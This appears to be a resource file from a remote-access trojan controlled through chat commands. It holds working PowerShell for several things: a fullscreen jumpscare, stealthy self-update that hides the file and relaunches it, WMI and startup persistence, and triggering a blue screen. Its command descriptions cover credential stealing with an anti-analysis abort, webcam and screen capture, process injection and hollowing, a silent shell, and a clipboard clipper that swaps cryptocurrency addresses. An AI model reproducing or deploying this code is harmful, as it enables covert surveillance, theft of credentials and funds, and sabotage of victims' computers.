SCRIPTS.JUMP_IMG_PS: Add-Type -AssemblyName System.Windows.Forms, System.Drawing; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class U{[DllImport("user32.dll")]public static extern int GetWindowLong(IntPtr h,int n);[DllImport("user32.dll")]public static extern int SetWindowLong(IntPtr h,int n,int v);}'; $f = New-Object System.Windows.Forms.Form; $f.WindowState = 'Maximized'; $f.FormBorderStyle = 'None'; $f.TopMost = $true; $f.ShowInTaskbar = $false; $f.ControlBox = $false; $f.Text = ''; $f.BackColor = [System.Drawing.Color]::Black; $h = $f.Handle; [U]::SetWindowLong($h, -20, ([U]::GetWindowLong($h, -20) -bor 0x80)); $pb = New-Object System.Windows.Forms.PictureBox; $pb.Dock = 'Fill'; $pb.SizeMode = 'Zoom'; try { $i = [System.Drawing.Image]::FromFile('__FILE_PATH__'); $pb.Image = $i } catch { $f.Close(); exit 1 }; $f.Controls.Add($pb); $t = New-Object System.Windows.Forms.Timer; $t.Interval = 10000; $t.Add_Tick({ $f.Close() }); $t.Start(); [void]$f.ShowDialog(); $i.Dispose();
SCRIPTS.JUMP_VID_PS: Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class U{[DllImport("user32.dll")]public static extern int GetWindowLong(IntPtr h,int n);[DllImport("user32.dll")]public static extern int SetWindowLong(IntPtr h,int n,int v);}'; $xaml = "<Window xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' WindowStyle='None' WindowState='Maximized' Background='Black' Topmost='True' ShowInTaskbar='False' AllowsTransparency='True' ResizeMode='NoResize'><Grid><MediaElement Name='MediaPlayer' LoadedBehavior='Manual' Stretch='Fill'/></Grid></Window>"; $w = [System.Windows.Markup.XamlReader]::Load([System.Xml.XmlNodeReader]::new([xml]$xaml)); $w.Add_SourceInitialized({ $h = (New-Object System.Windows.Interop.WindowInteropHelper($w)).Handle; [U]::SetWindowLong($h, -20, ([U]::GetWindowLong($h, -20) -bor 0x80)) }); $p = $w.FindName('MediaPlayer'); $p.Source = [System.Uri]::new('__FILE_PATH__'); $p.Volume = 1.0; $p.Play(); $p.Add_MediaEnded({ $w.Close() }); $w.ShowDialog()
SCRIPTS.UPDATE_PS: $ErrorActionPreference = 'SilentlyContinue'; $old_exe = '{old_path}'; $new_exe = '{new_path}'; Get-Process | Where-Object { $_.Path -eq $old_exe } | Stop-Process -Force; Start-Sleep -Seconds 2; if (Test-Path $old_exe) { Remove-Item -Path $old_exe -Force }; Move-Item -Path $new_exe -Destination $old_exe -Force; attrib +s +h $old_exe; Start-Process -FilePath $old_exe -ArgumentList '--hide-decoy' -WindowStyle Hidden; Start-Sleep -Seconds 2; Remove-Item $MyInvocation.MyCommand.Path -Force
SCRIPTS.REFRESH_PS: $ErrorActionPreference = 'SilentlyContinue'; Start-Sleep -Seconds 1; Stop-Process -Name "__NAME1__" -Force; Stop-Process -Name "__NAME2__" -Force; Get-Process | Where-Object { $_.Path -eq '__PATH__' } | Stop-Process -Force; Start-Sleep -Seconds 2; if (Test-Path '__PATH__') { Start-Process -FilePath '__PATH__' -ArgumentList '--hide-decoy' -WindowStyle Hidden }; Start-Sleep -Seconds 1; Remove-Item -Path $MyInvocation.MyCommand.Path -Force
SCRIPTS.UNINSTALL_PS: Start-Sleep -Seconds 3; Stop-Process -Name "snaky" -Force -ErrorAction SilentlyContinue; Stop-Process -Name "Microsoft.OneNote" -Force -ErrorAction SilentlyContinue; schtasks /delete /tn "__TASK_NAME__" /f *>$null 2>&1; $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Remove-ItemProperty -Path $regKey -Name "__TASK_NAME__" -ErrorAction SilentlyContinue; $startup = [System.Environment]::GetFolderPath('Startup'); $lnk = "$startup\__TASK_NAME__.lnk"; if (Test-Path $lnk) { Remove-Item $lnk -Force -ErrorAction SilentlyContinue }; attrib -s -h "__EXE_PATH__"; attrib -s -h "__DIR_PATH__" /s /d; Remove-Item -Path "__EXE_PATH__" -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1; Remove-Item -Path "__DIR_PATH__" -Recurse -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1; Remove-Item $MyInvocation.MyCommand.Path -Force
SCRIPTS.BSOD_CS: Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class CS{[DllImport("ntdll.dll")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool t,out bool v);[DllImport("ntdll.dll")]public static extern uint NtRaiseHardError(uint s,uint n,uint u,IntPtr r,uint o,out uint x);public static void K(){bool v;uint x;RtlAdjustPrivilege(19,true,false,out v);NtRaiseHardError(__CODE__,0,0,IntPtr.Zero,6,out x);}}'

DESC.JUMPSCARE: Display fullscreen jumpscare with attachment for 10 seconds (blocks input)
DESC.UPDATE: Update the bot from an attachment or URL
DESC.REFRESH: Restart the bot and kill other instances
DESC.WEBCAM: Capture webcam photo or list available cameras
DESC.SCREENSHOT: Capture the screen and send it as an image
DESC.FOREGROUND: Get current foreground window info with screenshot
DESC.BSOD: Trigger a Blue Screen of Death (BSOD)
DESC.PROCESS: Manage system processes (list, kill, info, hollow, dll, thread, inject)
DESC.OPENURL: Open a URL in the default browser
DESC.PRINT: Print a message or file to the default printer
DESC.CAT: Read the content of a file
DESC.DOWNLOAD: Download a file from the bot to your PC
DESC.MV: Move or rename a file or directory
DESC.SEARCH: Search for files in a directory
DESC.SIZE: Get the size of a file or directory
DESC.UPLOAD: Upload a file from your PC to the bot
DESC.ZIP: Compress a file or directory into a zip archive
DESC.NSLOOKUP: Perform a DNS lookup for a domain
DESC.CRASHPS: Crash and freeze a process by PID
DESC.STEALER:
🔍 **System Diagnostic & Deep Extraction Initiated...**
Gathering credentials, hardware specs, and network metadata.
DESC.STEALER_ANALYSIS: ⚠️ **Security Guard**: Analysis activity detected. Aborting to protect system integrity.
DESC.AUDIO: Play background audio (MP3/WAV) from URL or attachment
DESC.KCTSHELL: Execute a silent command via explorer.exe's KCT Phantom Fiber.

WIN.KCT_WMI_PERSIST_PS: $FilterArgs = @{{Name='{}'; EventNameSpace='root\CimV2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System" AND TargetInstance.SystemUpTime >= 120'}}; $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs; $ConsumerArgs = @{{Name='{}'; CommandLineTemplate='\"{}\" {}'}}; $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs; $BindingArgs = @{{Filter=$Filter; Consumer=$Consumer}}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs;

MSG.ERR_SHELL_ARGS:
ERROR: Please specify shell type and command.
Usage: `.shell <cmd|ps> <command>`
MSG.ERR_SHELL_TYPE: ERROR: Invalid shell type. Use `cmd` or `ps`
MSG.CLIP_ACTIONS_VAL:
**get** - Get current clipboard content
**set** - Set clipboard content
MSG.CLIP_ERR_PROVIDE_TEXT: **Error**: Please provide text to set on clipboard
MSG.CLIP_SET_DESC: Clipboard content has been updated successfully
MSG.CLIPPER_DESC: Automatically monitor and replace clipboard text based on rules
MSG.CLIP_HELP_CMDS:
**on** - Start monitoring clipboard
**off** - Stop monitoring
**add <from> <to>** - Add replacement rule
**remove <index>** - Remove rule by index
**list** - Show all rules
**clear** - Clear all rules
**setclip <crypto> <text>** - Set crypto clipper
**listclip** - Show all crypto clipper
**status** - Show current status
MSG.CLIP_HELP_EXAMPLES:
`.clipper add hi hello`
`.clipper add btc bitcoin`
`.clipper setclip btc <value>`
`.clipper on`
MSG.CLIP_ERR_PROVIDE_WARN:
**Error**: Please provide warning text
Example: `.clipper setclip btc <value>`
MSG.CLIP_WARN_NO_RULES: **Warning**: No replacement rules added. Add rules with `.clipper add <from> <to>`
MSG.CLIP_RULE_ADDED_DESC: New replacement rule has been added
MSG.CLIP_ERR_INVALID_IDX: **Error**: Invalid index. Must be between 1 and {}
MSG.CLIP_ERR_NO_RULES_CONFIG: No replacement rules or crypto clipper configured.
MSG.CLIP_LIST_FOOTER: Use .clipper remove <index> to remove a rule | .clipper setclip <crypto> <text> to change crypto clippers
MSG.CLIP_STATUS_FOOTER: Use .clipper list to see all rules
MSG.CLIP_ERR_INVALID_CRYPTO: **Error**: Invalid crypto type '{}'. Valid types: btc, eth, ltc, usdt, usdc, sol
MSG.CLIP_WARN_UPDATED_FMT_DESC: {} address warning message has been updated
